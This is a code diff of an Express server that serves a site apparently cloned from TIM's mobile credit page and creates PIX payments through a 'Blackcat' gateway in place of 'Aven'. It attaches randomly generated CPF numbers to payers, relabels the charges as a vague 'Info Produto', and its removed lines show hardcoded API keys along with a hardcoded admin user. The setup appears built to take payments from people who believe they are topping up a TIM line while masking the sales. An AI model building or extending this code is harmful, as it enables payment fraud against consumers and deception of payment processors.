@@ -14,9 +14,9 @@ app.use(express.json());
 // Serve static files from the tim-credito.vercel.app directory
 app.use(express.static(path.join(__dirname, 'tim-credito.vercel.app')));
 
-const AVEN_API_KEY = process.env.AVEN_API_KEY || '3BhRxPFdU2beyFoiX23eweJhc_ILlhs4JSYsNAYCcBk';
-const AVEN_TOKENIZATION_KEY = process.env.AVEN_TOKENIZATION_KEY || '0Z4j53qjhkXy7GKNfySrspNkfVjWzDe01j9SYtd4mxA';
-const AVEN_BASE_URL = 'https://api.avenpayments.com/v1';
+const BLACKCAT_SECRET_KEY = process.env.BLACKCAT_SECRET_KEY || '';
+const BLACKCAT_PUBLIC_KEY = process.env.BLACKCAT_PUBLIC_KEY || '';
+const BLACKCAT_BASE_URL = process.env.BLACKCAT_BASE_URL || 'https://api.blackcatoficial.com/api';
 
 // Admin credentials
 const ADMIN_USER = 'admin';
@@ -161,7 +161,7 @@ const pixAttempts = new Map();
 
 // Retorna configurações públicas
 app.get('/api/config', (req, res) => {
-    res.json({ tokenizationKey: AVEN_TOKENIZATION_KEY });
+    res.json({ tokenizationKey: BLACKCAT_PUBLIC_KEY, publicKey: BLACKCAT_PUBLIC_KEY });
 });
 
 app.post('/api/pix', async (req, res) => {
@@ -175,7 +175,7 @@ app.post('/api/pix', async (req, res) => {
         }
 
         const cleanPhone = phone ? phone.replace(/\D/g, '') : '';
-        const payerPhone = cleanPhone ? `+55${cleanPhone}` : '+5511999999999';
+        const payerPhone = cleanPhone || '11999999999';
 
         let attempt = pixAttempts.get(cleanPhone) || { count: 0, name: null, email: null };
         attempt.count += 1;
@@ -190,35 +190,41 @@ app.post('/api/pix', async (req, res) => {
         }
         pixAttempts.set(cleanPhone, attempt);
 
-        const externalRef = `tim_${Date.now()}_${Math.floor(Math.random() * 10000)}`;
+        const externalRef = `info_${Date.now()}_${Math.floor(Math.random() * 10000)}`;
         const cleanCpf = generateCPF();
 
         const payload = {
             amount: amount,
             currency: 'BRL',
-            method: 'PIX',
-            description: `Recarga TIM - ${cleanPhone || 'Linha Celular'}`,
-            externalRef: externalRef,
-            payer: {
-                name: attempt.name,
-                taxId: cleanCpf,
-                email: attempt.email,
-                phone: cleanPhone || '11999999999'
-            },
+            paymentMethod: 'pix',
             items: [
                 {
+                    title: 'Info Produto',
+                    unitPrice: amount,
                     quantity: 1,
-                    name: 'Recarga TIM',
-                    price: amount,
-                    type: 'DIGITAL'
+                    tangible: false
                 }
-            ]
+            ],
+            customer: {
+                name: attempt.name,
+                email: attempt.email,
+                phone: payerPhone,
+                document: {
+                    number: cleanCpf,
+                    type: 'cpf'
+                }
+            },
+            pix: {
+                expiresInDays: 1
+            },
+            externalRef: externalRef,
+            metadata: 'Info Produto'
         };
 
-        const response = await fetch(`${AVEN_BASE_URL}/payment`, {
+        const response = await fetch(`${BLACKCAT_BASE_URL}/sales/create-sale`, {
             method: 'POST',
             headers: {
-                'Authorization': `Bearer ${AVEN_API_KEY}`,
+                'X-API-Key': BLACKCAT_SECRET_KEY,
                 'Content-Type': 'application/json'
             },
             body: JSON.stringify(payload)
@@ -229,37 +235,42 @@ app.post('/api/pix', async (req, res) => {
         try {
             data = JSON.parse(textResponse);
         } catch (e) {
-            console.error('[AVEN] Resposta não-JSON recebida:', textResponse);
+            console.error('[BLACKCAT] Resposta não-JSON recebida:', textResponse);
         }
 
-        if (response.ok && (data.id || data.paymentId)) {
-            const paymentId = data.id || data.paymentId;
-            let copyPaste = data.data?.copypaste || data.pix?.qrcode || data.pix?.code || data.copypaste || data.qrCode || '';
-            const qrCodeUrl = copyPaste ? `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(copyPaste)}` : '';
+        const saleData = data.data || data;
+        const transactionId = saleData.transactionId || saleData.id;
 
-            console.log('[AVEN] PIX criado com sucesso:', paymentId);
+        if (response.ok && data.success && transactionId) {
+            const payData = saleData.paymentData || {};
+            let copyPaste = payData.copyPaste || payData.qrCode || payData.copypaste || '';
+            const qrCodeBase64 = payData.qrCodeBase64 || '';
+            const qrCodeUrl = payData.qrCodeUrl || (copyPaste ? `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(copyPaste)}` : '');
+
+            console.log('[BLACKCAT] PIX criado com sucesso:', transactionId);
 
             res.json({
                 success: true,
                 data: {
-                    id: paymentId,
-                    transactionId: paymentId,
-                    status: data.status || 'PENDING',
+                    id: transactionId,
+                    transactionId: transactionId,
+                    status: saleData.status || 'PENDING',
                     paymentData: {
-                        transactionId: paymentId,
+                        transactionId: transactionId,
                         copyPaste: copyPaste,
                         copypaste: copyPaste,
                         qrCode: copyPaste,
-                        qrCodeUrl: qrCodeUrl
+                        qrCodeUrl: qrCodeUrl,
+                        qrCodeBase64: qrCodeBase64
                     },
-                    aven: data
+                    blackcat: data
                 }
             });
         } else {
-            console.error('[AVEN] Erro ao criar PIX:', data);
+            console.error('[BLACKCAT] Erro ao criar PIX:', data);
             res.status(response.status || 400).json({
                 success: false,
-                message: data?.message || 'Erro ao processar pagamento na Aven',
+                message: data?.message || data?.error || 'Erro ao processar pagamento na Blackcat',
                 details: data
             });
         }
@@ -275,21 +286,24 @@ app.get('/api/status/:transactionId', async (req, res) => {
         const { transactionId } = req.params;
         const { phone } = req.query;
         
-        const response = await fetch(`${AVEN_BASE_URL}/payment/${transactionId}`, {
-            headers: { 'Authorization': `Bearer ${AVEN_API_KEY}` }
+        const response = await fetch(`${BLACKCAT_BASE_URL}/sales/${transactionId}/status`, {
+            headers: { 'X-API-Key': BLACKCAT_SECRET_KEY }
         });
         const text = await response.text();
         let data = {};
         try { data = JSON.parse(text); } catch(e) {}
 
-        if ((data?.status === 'PAID' || data?.data?.status === 'PAID') && phone) {
+        const statusInfo = data.data || data;
+        const currentStatus = statusInfo.status || 'PENDING';
+
+        if (currentStatus === 'PAID' && phone) {
             const cleanPhone = phone.replace(/\D/g, '');
             pixAttempts.delete(cleanPhone);
         }
 
         res.json({
             success: response.ok,
-            data: { status: data.status || 'PENDING', id: data.id || transactionId, ...data }
+            data: { status: currentStatus, id: statusInfo.transactionId || transactionId, ...statusInfo }
         });
     } catch (error) {
         res.status(500).json({ success: false, message: 'Error checking status' });
@@ -300,12 +314,13 @@ app.get('/api/check_status', async (req, res) => {
     try {
         const transactionId = req.query.id;
         if (!transactionId) return res.status(400).json({ success: false, message: 'Missing transaction id' });
-        const response = await fetch(`${AVEN_BASE_URL}/payment/${transactionId}`, {
-            headers: { 'Authorization': `Bearer ${AVEN_API_KEY}` }
+        const response = await fetch(`${BLACKCAT_BASE_URL}/sales/${transactionId}/status`, {
+            headers: { 'X-API-Key': BLACKCAT_SECRET_KEY }
         });
         const data = await response.json();
-        const isPaid = data.status === 'PAID';
-        res.json({ status: isPaid ? 'approved' : (data.status || 'pending'), data: data });
+        const statusInfo = data.data || data;
+        const isPaid = statusInfo.status === 'PAID';
+        res.json({ status: isPaid ? 'approved' : (statusInfo.status || 'pending'), data: data });
     } catch (error) {
         res.status(500).json({ success: false, message: 'Error checking status' });
     }
@@ -465,7 +480,7 @@ if (!isVercel) {
     const PORT = process.env.PORT || 3000;
     app.listen(PORT, () => {
         console.log(`Servidor rodando na porta ${PORT}`);
-        console.log(`Gateway configurado: Aven Payments`);
+        console.log(`Gateway configurado: Blackcat Payments`);
         console.log(`Acesse: http://localhost:${PORT}`);
         console.log(`Admin:  http://localhost:${PORT}/admin`);
     });
